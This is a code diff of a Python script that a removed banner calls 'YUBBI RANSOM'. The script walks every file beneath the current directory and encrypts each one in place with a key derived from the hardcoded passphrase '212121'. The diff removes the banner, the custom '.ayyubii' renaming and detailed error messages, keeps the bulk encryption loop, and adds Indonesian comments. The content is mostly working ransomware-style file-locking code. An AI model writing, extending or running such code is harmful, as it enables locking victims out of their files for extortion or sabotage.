@@ -4,54 +4,24 @@ import base64
 import hashlib
 import crypto_core
 
-# ===============================
-# ASCII BANNER
-# ===============================
-BANNER = r"""
-██╗   ██╗██╗   ██╗██████╗ ██████╗ ██╗                 
-╚██╗ ██╔╝██║   ██║██╔══██╗██╔══██╗██║                 
- ╚████╔╝ ██║   ██║██████╔╝██████╔╝██║                 
-  ╚██╔╝  ██║   ██║██╔══██╗██╔══██╗██║                 
-   ██║   ╚██████╔╝██████╔╝██████╔╝██║                 
-   ╚═╝    ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝                 
-                                                      
-██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
-██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
-██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
-██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
-██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
-╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
-                                                                
-       by AYYUBI -
-"""
-
-# ===============================
-# PERMANENT KEY SETUP
-# ===============================
+# PASSCODE yang kamu mau
 PASSPHRASE = "212121"
+
+# Bentuk Fernet key valid dari passphrase (tanpa ubah crypto_core)
 digest = hashlib.sha256(PASSPHRASE.encode()).digest()
 fernet_key = base64.urlsafe_b64encode(digest)
+
+# Set key ke crypto_core
 crypto_core.encryption_key = fernet_key
 
-# ===============================
-# HELP / USAGE
-# ===============================
-if len(sys.argv) != 2 or sys.argv[1] in ["-h", "--help"]:
-    print(BANNER)
+if len(sys.argv) != 2:
     print("Usage:")
-    print("  python main.py encrypt    # Encrypt all files")
-    print("  python main.py decrypt    # Decrypt all files")
-    sys.exit(0)
+    print("  python main.py encrypt")
+    print("  python main.py decrypt")
+    sys.exit(1)
 
 mode = sys.argv[1]
-extension = ".ayyubii"  # Custom extension
 
-print(BANNER)
-print(f"[INFO] Mode: {mode.upper()}")
-
-# ===============================
-# LOOP ENCRYPT/DECRYPT
-# ===============================
 for root, dirs, files in os.walk("."):
     for file in files:
         if file in ["main.py", "crypto_core.py", "README.md"]:
@@ -60,13 +30,9 @@ for root, dirs, files in os.walk("."):
         try:
             if mode == "encrypt":
                 crypto_core.encrypt_file(path)
-                os.rename(path, path + extension)
                 print("[ENCRYPTED]", path)
             elif mode == "decrypt":
-                if file.endswith(extension):
-                    crypto_core.decrypt_file(path)
-                    original = os.path.splitext(path)[0]
-                    os.rename(path, original)
-                    print("[DECRYPTED]", path)
-        except Exception as e:
-            print("[SKIPPED]", path, "| Reason:", str(e))
+                crypto_core.decrypt_file(path)
+                print("[DECRYPTED]", path)
+        except:
+            print("[SKIPPED]", path)
